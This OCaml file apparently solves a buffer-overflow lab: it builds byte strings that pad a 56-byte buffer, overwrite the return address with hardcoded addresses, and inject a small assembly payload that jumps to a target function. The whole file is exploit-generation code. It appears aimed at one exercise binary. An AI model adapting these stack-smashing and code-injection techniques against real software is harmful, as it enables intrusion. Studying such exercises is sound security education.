open Octosyn
open Utils

let pad_adr l =
  l @ List.init (max 0 (8 - List.length l)) (fun _ -> 0)


let mini_exploit buff_size call =
  let nop   = hex "aa" in
  let adr   = List.rev (parse_bytes call) |> pad_adr in
  let adrl  = List.length adr in
  let buff  = Array.make (buff_size + adrl) nop in
  List.iteri (fun i x -> buff.(buff_size + i) <- x) adr;
  buff

let exploit buff_size payload call =
  let nop   = hex "aa" in
  let adr   = List.rev (parse_bytes call) |> pad_adr in
  let asm   = Asm.asm payload in
  let pay   = Asm.asm_bytes asm in
  let payl  = Asm.asm_size asm in
  let buff  = Array.make (buff_size + 8 + payl) nop in
  Array.iteri (fun i x -> buff.(buff_size + 8 + i) <- x) pay;
  List.iteri (fun i x -> buff.(buff_size + i) <- x) adr;
  buff

let exploit_clean buff_size payload call =
  let nop   = hex "aa" in
  let asm   = Asm.asm payload in
  let pay   = Asm.asm_bytes asm in
  let payl  = Asm.asm_size asm in
  let adr   = List.rev (parse_bytes call |> bytes_sub payl) |> pad_adr in
  let buff  = Array.make (buff_size + 8) nop in
  Array.iteri (fun i x -> buff.(buff_size - payl + i) <- x) pay;
  List.iteri (fun i x -> buff.(buff_size + i) <- x) adr;
  buff

let _ = mini_exploit 56 "00 00 00 00 00 42 1d 6a" |> Asm.print_bytes

let _ = print_endline ""

let payload = "mov edi, 0x40c15130; push 0x00421d96; ret"

(* let _ = payload |> Asm.asm |> Asm.asm_bytes |> Asm.print_bytes *)

(* let _ = "55 61 3b f0" |> parse_bytes |> bytes_add 8 |> string_of_bytes |> print_endline *)

(* base16_of_int 32 |> List.iter (fun i -> print_int i; print_char ' ') *)

(* let _ = exploit 56 payload "55 61 3b f8" |> Asm.print_bytes *)
let _ = exploit_clean 56 payload "55 61 3b f0" |> Asm.print_bytes

